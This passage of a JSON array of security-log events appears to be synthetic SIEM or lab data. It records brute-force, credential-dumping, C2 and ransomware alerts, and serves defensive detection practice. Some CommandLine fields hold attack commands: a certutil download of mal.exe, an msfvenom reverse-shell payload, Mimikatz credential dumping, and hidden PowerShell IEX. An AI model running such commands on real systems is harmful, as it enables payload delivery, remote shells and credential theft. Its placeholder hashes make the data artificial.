  {
    "TimeGenerated": "2026-04-24T05:38:37.661647",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-21T14:24:37.660912",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "lab.administrator",
    "Computer": "WAZUH-MANAGER-01",
    "SourceIP": "192.168.56.101",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T23:22:37.661061",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "lab.administrator",
    "Computer": "KALI-LAB-01",
    "SourceIP": "10.0.2.15",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T02:49:37.660233",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "temp.analyst",
    "Computer": "KALI-LAB-01",
    "SourceIP": "77.73.133.84",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T06:34:37.663688",
    "EventType": "Sysmon Network Connection",
    "Severity": "Medium",
    "EventCode": 3,
    "UserAccount": "temp.analyst",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "45.67.22.10",
    "MitreTechnique": "T1071.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "certutil.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T10:10:37.660486",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "temp.analyst",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T18:32:37.660057",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WAZUH-MANAGER-01",
    "SourceIP": "10.0.2.10",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T06:13:37.661392",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-20T04:44:37.668200",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "185.220.101.45",
    "DestinationIP": "10.0.2.15",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T14:16:37.664965",
    "EventType": "LOLBIN Execution",
    "Severity": "High",
    "EventCode": 1,
    "UserAccount": "jane.smith",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1218",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "certutil -urlcache -split -f http://192.168.56.104/mal.exe C:\\Windows\\Temp\\mal.exe",
    "ProcessName": "regsvr32.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T10:58:37.664064",
    "EventType": "Sysmon Registry Set",
    "Severity": "High",
    "EventCode": 13,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1547.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "cmd.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T05:43:37.663019",
    "EventType": "Password Spray",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "jane.smith",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T07:30:37.664637",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "svc.backup",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell -c (New-Object Net.WebClient).DownloadFile",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T17:04:37.665867",
    "EventType": "PsExec Detected",
    "Severity": "High",
    "EventCode": 7045,
    "UserAccount": "john.doe",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1570",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T04:10:37.667504",
    "EventType": "Malware Detected",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "SPLUNK-VM-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Defender / Wazuh",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": "Ryuk.Ransomware",
    "FileHash": "a1b2c3d4e5f6789012345678abcdef01",
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T07:40:37.668696",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "194.165.16.11",
    "DestinationIP": "172.16.0.100",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T16:57:37.662448",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "root",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-20T10:13:37.668793",
    "EventType": "IDS Alert",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "10.0.2.10",
    "DestinationIP": "91.234.56.78",
    "MitreTechnique": null,
    "LogSource": "Suricata / Snort",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T18:40:37.667724",
    "EventType": "Ransomware Activity",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "KALI-LAB-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1486",
    "LogSource": "Sysmon / EDR",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T04:25:37.665880",
    "EventType": "PsExec Detected",
    "Severity": "High",
    "EventCode": 7045,
    "UserAccount": "svc.backup",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1570",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T09:21:37.665577",
    "EventType": "RDP Login",
    "Severity": "Medium",
    "EventCode": 4624,
    "UserAccount": "dev.engineer",
    "Computer": null,
    "SourceIP": "192.168.56.102",
    "DestinationIP": null,
    "MitreTechnique": "T1021.001",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T06:32:37.665440",
    "EventType": "RDP Login",
    "Severity": "Medium",
    "EventCode": 4624,
    "UserAccount": "praharsh.admin",
    "Computer": null,
    "SourceIP": "192.168.56.103",
    "DestinationIP": null,
    "MitreTechnique": "T1021.001",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T09:19:37.659849",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "john.doe",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "103.45.78.21",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T16:56:37.662902",
    "EventType": "Password Spray",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "john.doe",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T06:12:37.663884",
    "EventType": "Sysmon File Create",
    "Severity": "Medium",
    "EventCode": 11,
    "UserAccount": "svc.splunk",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1105",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "wmic.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T01:01:37.660279",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "john.doe",
    "Computer": "KALI-LAB-01",
    "SourceIP": "77.73.133.84",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T00:53:37.667175",
    "EventType": "Credential Dumping",
    "Severity": "Critical",
    "EventCode": 10,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1003.001",
    "LogSource": "Sysmon Event ID 10",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": "procdump.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T01:12:37.665766",
    "EventType": "PsExec Detected",
    "Severity": "High",
    "EventCode": 7045,
    "UserAccount": "praharsh.admin",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1570",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T10:37:37.667509",
    "EventType": "Malware Detected",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Defender / Wazuh",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": "Ryuk.Ransomware",
    "FileHash": "e10adc3949ba59abbe56e057f20f883e",
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T02:36:37.663270",
    "EventType": "Sysmon Process Create",
    "Severity": "Critical",
    "EventCode": 1,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1003.001",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "mimikatz.exe lsadump::sam",
    "ProcessName": "procdump.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T03:24:37.665927",
    "EventType": "WMI Remote Execution",
    "Severity": "High",
    "EventCode": 1,
    "UserAccount": "svc.backup",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1047",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": "wmic /node:TARGET process call create cmd.exe",
    "ProcessName": "wmiprvse.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T20:06:37.669380",
    "EventType": "Wazuh Alert",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Wazuh Manager",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T19:47:37.665888",
    "EventType": "PsExec Detected",
    "Severity": "High",
    "EventCode": 7045,
    "UserAccount": "svc.backup",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1570",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T21:59:37.661354",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-20T17:40:37.662354",
    "EventType": "RDP Brute Force",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "dev.engineer",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra / CrackMapExec"
  },
  {
    "TimeGenerated": "2026-04-19T18:29:37.662642",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "splunk",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-21T04:08:37.665690",
    "EventType": "RDP Login",
    "Severity": "Medium",
    "EventCode": 4624,
    "UserAccount": "lab.administrator",
    "Computer": null,
    "SourceIP": "192.168.56.102",
    "DestinationIP": null,
    "MitreTechnique": "T1021.001",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T11:33:37.666180",
    "EventType": "C2 Outbound Connection",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "77.73.133.84",
    "MitreTechnique": "T1071.001",
    "LogSource": "Firewall / Sysmon",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T10:29:37.667715",
    "EventType": "Ransomware Activity",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1486",
    "LogSource": "Sysmon / EDR",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T19:03:37.668892",
    "EventType": "IDS Alert",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.105",
    "DestinationIP": "23.129.64.100",
    "MitreTechnique": null,
    "LogSource": "Suricata / Snort",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T20:15:37.659901",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "dev.engineer",
    "Computer": "ELK-SERVER-01",
    "SourceIP": "192.168.56.101",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T21:02:37.666131",
    "EventType": "C2 Outbound Connection",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "23.129.64.100",
    "MitreTechnique": "T1071.001",
    "LogSource": "Firewall / Sysmon",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T06:14:37.667612",
    "EventType": "Process Injection",
    "Severity": "Critical",
    "EventCode": 8,
    "UserAccount": null,
    "Computer": "ELK-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1055",
    "LogSource": "Sysmon Event ID 8",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T03:51:37.668746",
    "EventType": "IDS Alert",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.102",
    "DestinationIP": "23.129.64.100",
    "MitreTechnique": null,
    "LogSource": "Suricata / Snort",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T16:26:37.667234",
    "EventType": "Malware Detected",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "KALI-LAB-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Defender / Wazuh",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": "Mimikatz",
    "FileHash": "e10adc3949ba59abbe56e057f20f883e",
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T08:30:37.664726",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "temp.analyst",
    "Computer": "FIN-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell Invoke-Mimikatz",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T06:42:37.664646",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "praharsh.admin",
    "Computer": "DEV-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell -nop -w hidden -c IEX",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T05:50:37.664329",
    "EventType": "Reverse Shell Detected",
    "Severity": "Critical",
    "EventCode": 1,
    "UserAccount": "attacker",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "192.168.56.104",
    "MitreTechnique": "T1059.001",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Metasploit / Netcat"
  },
  {
    "TimeGenerated": "2026-04-22T00:50:37.666520",
    "EventType": "C2 Outbound Connection",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "45.67.22.10",
    "MitreTechnique": "T1071.001",
    "LogSource": "Firewall / Sysmon",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T01:07:37.669211",
    "EventType": "Phishing Email",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1566.001",
    "LogSource": "Email Gateway",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T20:26:37.667966",
    "EventType": "Cloud IAM Change",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "temp.analyst",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1098",
    "LogSource": "CloudTrail / Azure AD",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T02:38:37.660142",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "jane.smith",
    "Computer": "DEV-SERVER-01",
    "SourceIP": "91.234.56.78",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T21:31:37.666551",
    "EventType": "DNS Tunneling Detected",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1071.004",
    "LogSource": "DNS / Zeek",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T10:46:37.662827",
    "EventType": "Kerberos TGS Request",
    "Severity": "High",
    "EventCode": 4769,
    "UserAccount": "svc.splunk",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1558.003",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T06:45:37.666351",
    "EventType": "C2 Outbound Connection",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "23.129.64.100",
    "MitreTechnique": "T1071.001",
    "LogSource": "Firewall / Sysmon",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T01:20:37.665189",
    "EventType": "Port Scan Detected",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1046",
    "LogSource": "Firewall / IDS",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Nmap"
  },
  {
    "TimeGenerated": "2026-04-20T10:30:37.669337",
    "EventType": "Wazuh Alert",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Wazuh Manager",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T21:08:37.668533",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.104",
    "DestinationIP": "172.16.0.100",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T20:11:37.667962",
    "EventType": "Cloud IAM Change",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "temp.analyst",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1098",
    "LogSource": "CloudTrail / Azure AD",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T11:54:37.667205",
    "EventType": "Credential Dumping",
    "Severity": "Critical",
    "EventCode": 10,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1003.001",
    "LogSource": "Sysmon Event ID 10",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": "comsvcs.dll",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T11:56:37.665257",
    "EventType": "Privilege Escalation",
    "Severity": "Critical",
    "EventCode": 4672,
    "UserAccount": "jane.smith",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1068",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T01:38:37.664166",
    "EventType": "Sysmon Registry Set",
    "Severity": "High",
    "EventCode": 13,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1547.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "certutil.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T19:45:37.662871",
    "EventType": "Password Spray",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
